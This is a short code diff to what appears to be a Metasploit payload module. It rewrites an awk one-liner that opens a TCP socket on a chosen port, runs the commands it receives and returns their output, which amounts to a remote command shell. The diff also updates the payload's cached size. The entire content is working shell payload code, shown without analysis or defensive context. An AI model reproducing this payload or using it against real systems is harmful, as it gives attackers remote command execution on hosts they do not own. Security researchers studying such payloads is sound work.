@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 96
+  CachedSize = 136
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -42,13 +42,13 @@ module MetasploitModule
   # Constructs the payload
   #
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
   # Returns the command string to use for execution
   #
   def command_string
-    "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
+    "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\");close(s)}}'"
   end
 end
